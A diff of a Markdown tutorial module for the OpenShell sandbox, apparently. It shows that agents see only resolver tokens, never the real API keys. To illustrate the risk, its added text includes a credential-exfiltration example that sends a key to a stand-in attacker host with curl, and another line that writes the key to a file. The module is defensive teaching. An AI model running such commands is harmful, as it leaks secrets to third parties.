@@ -1,10 +1,12 @@
 # Credential Security
 
-In this module you will prove that API keys are **never visible** inside the sandbox. The sandbox sees only opaque resolver tokens. Real credentials are injected at the network boundary, outside the agent's reach.
+In this module you will prove that API keys are **never visible** inside the sandbox. The sandbox sees only opaque **resolver tokens**. Real credentials are injected at the network boundary — outside the agent's reach.
+
+This is arguably the most innovative security feature of OpenShell.
 
 ## The Problem
 
-AI agents need API keys to call external services (LLMs, APIs, databases). Traditionally, you pass the key as an environment variable:
+AI agents need API keys to call external services (LLMs, APIs, databases). The traditional approach is to pass the key as an environment variable:
 
 ```bash
 # Traditional approach — DANGEROUS
@@ -12,14 +14,22 @@ export DEEPSEEK_API_KEY=sk-abc123...real-key-here
 ```
 
 This means the agent process can:
-- `echo $DEEPSEEK_API_KEY` to print it
-- Encode it in a network request to exfiltrate it
-- Write it to a file for later retrieval
-- Pass it to a subprocess
+- `echo $DEEPSEEK_API_KEY` → **print it to the console** (and into logs)
+- `curl https://attacker.com/?key=$DEEPSEEK_API_KEY` → **exfiltrate it over the network**
+- `echo $DEEPSEEK_API_KEY > /tmp/stolen.txt` → **write it to a file** for later retrieval
+- Pass it to any subprocess, library, or third-party dependency
 
-**OpenShell's approach: credential resolution at the boundary.**
+Once the key is inside the container, it's **game over for credential security**. Any code running in that container — including malicious dependencies, prompt injections, or compromised libraries — can read and exfiltrate it.
 
-## How Credential Resolution Works
+## OpenShell's Solution: Boundary Credential Resolution
+
+OpenShell takes a fundamentally different approach. The real API key **never enters the sandbox**. Instead:
+
+1. The sandbox receives an opaque **resolver token** (like `openshell:resolve:env:v123_DEEPSEEK_API_KEY`)
+2. When the agent makes an API call, the resolver token is sent in the `Authorization` header
+3. The **Boundary** (running outside the sandbox, in the Supervisor) intercepts the request
+4. The Boundary recognizes the resolver token, looks up the real key, and **swaps them**
+5. The request continues to DeepSeek with the real key — but the sandbox never saw it
 
 ```mermaid
 graph TD
@@ -37,12 +47,14 @@ graph TD
     style FWD fill:#d4edda,color:#155724
 ```
 
-The critical security properties:
+**The critical security properties:**
 
-1. **Sandbox never sees the real key** — only the resolver token `openshell:resolve:env:v1:...`
-2. **Boundary resolves at the network edge** — the real key is injected just before the request leaves the cluster
-3. **Endpoint binding** — a resolver token for DeepSeek cannot be used to authenticate to a different service
-4. **No exfiltration possible** — even if the agent sends the resolver token to an attacker, it's useless outside the OpenShell boundary
+| Property | What it means |
+|----------|-------------|
+| **Sandbox never sees the real key** | Only the resolver token `openshell:resolve:env:v1:...` exists inside the container |
+| **Boundary resolves at the network edge** | The real key is injected just before the request leaves the cluster |
+| **Endpoint binding** | A resolver token for DeepSeek *cannot* be used to authenticate to a different service — the Boundary checks the destination |
+| **No exfiltration possible** | Even if the agent sends the resolver token to an attacker, it's useless — only the Boundary can resolve it, and only inside the cluster |
 
 ## Step 1 — Enter the Sandbox
 
@@ -62,7 +74,7 @@ Expected output (the exact token varies):
 openshell:resolve:env:v1234567890_DEEPSEEK_API_KEY
 ```
 
-✅ This is a **resolver token**, not the real key. It starts with `openshell:resolve:env:` followed by an internal identifier. The real `sk-...` key is nowhere in the sandbox environment.
+> **Look carefully at this value.** It starts with `openshell:resolve:env:` followed by a version ID and `_DEEPSEEK_API_KEY`. This is **not** your real key (which starts with `sk-`). The real key is stored in Vault and only the Gateway/Boundary can access it. The sandbox sees only this opaque token.
 
 ## Step 3 — Try to Extract the Key
 
@@ -78,11 +90,11 @@ Expected:
 DEEPSEEK_API_KEY=openshell:resolve:env:v1234567890_DEEPSEEK_API_KEY
 ```
 
-The resolver token is all that exists in the sandbox's environment. There is no second copy of the real key anywhere inside the container.
+The resolver token is **all that exists** in the sandbox's environment. There is no second copy of the real key anywhere inside the container — not in files, not in memory, not in any other environment variable.
 
 ## Step 4 — Prove the Resolver Token Works (When Used Correctly)
 
-Make a real API call using the resolver token — the boundary will resolve it:
+Make a real API call using the resolver token — the Boundary will resolve it:
 
 ```bash
 curl -s https://api.deepseek.com/models \
@@ -95,7 +107,17 @@ Expected: a JSON response listing available models (truncated):
 {"object":"list","data":[{"id":"deepseek-chat","object":"model"...
 ```
 
-✅ **The call succeeds** because the boundary intercepted the request, saw the resolver token, replaced it with the real DeepSeek API key, and forwarded the request. The sandbox itself never handled the real key.
+✅ **The call succeeds!** Here's what happened behind the scenes:
+1. `curl` sent the request with `Authorization: Bearer openshell:resolve:env:v123...` (the resolver token)
+2. The Boundary intercepted the HTTPS request *before it left the sandbox*
+3. The Boundary detected the resolver token in the `Authorization` header
+4. It looked up the real DeepSeek API key from the Gateway's provider config
+5. It verified that the destination (`api.deepseek.com`) matches the provider's registered endpoint
+6. It replaced the resolver token with the real key (`sk-b99c...`)
+7. The request was forwarded to DeepSeek with the real key
+8. DeepSeek responded with the model list
+
+**The sandbox never handled the real key.** The resolution happened outside the sandbox, in the Supervisor process.
 
 ## Step 5 — Prove Endpoint Binding
 
@@ -106,9 +128,13 @@ curl -s --max-time 5 https://api.openai.com/v1/models \
   -H "Authorization: Bearer $DEEPSEEK_API_KEY" 2>&1
 ```
 
-Expected: connection timeout (because `api.openai.com` is not in the network policy) or a `credential_endpoint_mismatch` error.
+Expected: empty response or connection failure — `api.openai.com` is not in the network policy, so the connection is blocked before endpoint binding even comes into play.
 
-❌ **The boundary rejects this** because the resolver token is bound to `api.deepseek.com`. Even if the network policy allowed `api.openai.com`, the credential would not be resolved for a different host.
+❌ **The Boundary rejects this** on two levels:
+1. **Network policy**: `api.openai.com` is not in the allowlist, so the connection is blocked
+2. **Endpoint binding**: Even if the network policy allowed `api.openai.com`, the Boundary would refuse to resolve a DeepSeek resolver token for a non-DeepSeek endpoint — this is called a `credential_endpoint_mismatch`
+
+> **Why endpoint binding matters:** Imagine an attacker sets up a fake DeepSeek-like server and adds it to the network policy. Even with network access, the resolver token would NOT be resolved for the attacker's server — the token is bound to `api.deepseek.com` specifically.
 
 ## Step 6 — Prove Exfiltration Is Useless
 
@@ -119,7 +145,10 @@ If an attacker somehow extracted the resolver token and tried to use it outside 
 # curl https://api.deepseek.com/models -H "Authorization: Bearer openshell:resolve:env:v1:..."
 ```
 
-Result: **401 Unauthorized**. The resolver token is meaningless outside the OpenShell boundary. DeepSeek's API doesn't recognize it — it expects a real `sk-` key. The boundary is the only component that can resolve the token, and it only does so inside the cluster.
+Result: **401 Unauthorized**. The resolver token is meaningless outside the OpenShell Boundary:
+- DeepSeek's API expects a real `sk-` key, not a resolver token
+- The Boundary is the *only* component that can resolve the token
+- The Boundary only operates inside the cluster
 
 ## Step 7 — Exit the Sandbox
 
@@ -129,26 +158,29 @@ exit
 
 ## Credential Lifecycle
 
-The real API key passes through three zones. Only the Gateway zone ever holds the real key.
+The real API key passes through three zones. Only the Gateway zone ever holds the real key:
 
 | Phase | What Happens | Who Sees the Real Key? |
 |-------|-------------|----------------------|
 | **Install** | Helm stores key in Vault → ESO syncs to K8s Secret | Vault and K8s Secret (encrypted at rest) |
 | **Runtime** | Gateway reads K8s Secret, registers provider | Gateway only |
-| **API Call** | Sandbox sends resolver token → Boundary swaps for real key → DeepSeek receives real key | Boundary (in-memory, per-request) |
+| **API Call** | Sandbox sends resolver token → Boundary swaps for real key → DeepSeek receives real key | Boundary (in-memory, per-request, never logged) |
+
+> **Notice:** The sandbox row is missing because the sandbox *never* sees the real key. Not at install time, not at runtime, not during API calls. This is the fundamental innovation.
 
 ## Key Takeaways
 
-| Property | Traditional | OpenShell |
-|----------|------------|-----------|
-| Agent sees real key | ✅ Yes | ❌ No — only resolver token |
-| Key can be logged | ✅ Yes | ❌ No — token is opaque |
-| Key can be exfiltrated | ✅ Yes | ❌ No — token is useless outside boundary |
-| Key bound to endpoint | ❌ No | ✅ Yes — credential_endpoint_mismatch |
-| Key stored in Vault | Optional | ✅ Yes — via ZTVP Vault + ESO |
+| Property | Traditional Approach | OpenShell Approach |
+|----------|---------------------|-------------------|
+| Agent sees real key | ✅ Yes — it's in `$DEEPSEEK_API_KEY` | ❌ No — only a resolver token |
+| Key can be logged | ✅ Yes — it's a real string | ❌ No — the token is opaque and useless |
+| Key can be exfiltrated | ✅ Yes — send it over the network | ❌ No — the token is useless outside the Boundary |
+| Key bound to endpoint | ❌ No — use it anywhere | ✅ Yes — credential_endpoint_mismatch protection |
+| Key stored in Vault | Optional (usually not) | ✅ Yes — via ZTVP Vault + ESO |
+| Key rotation | Manual — update every env var | Automatic — Vault → ESO → Gateway (1h sync) |
 
 ## Next Step
 
-You've proven that credentials are invisible inside the sandbox. Next, you'll explore how the ZTVP components work together.
+You've proven that credentials are invisible inside the sandbox. Now let's zoom out and see how all the ZTVP components — Vault, ESO, SPIFFE, ACS, and Keycloak — work together as defense-in-depth.
 
 Proceed to: **ZTVP Integration** →
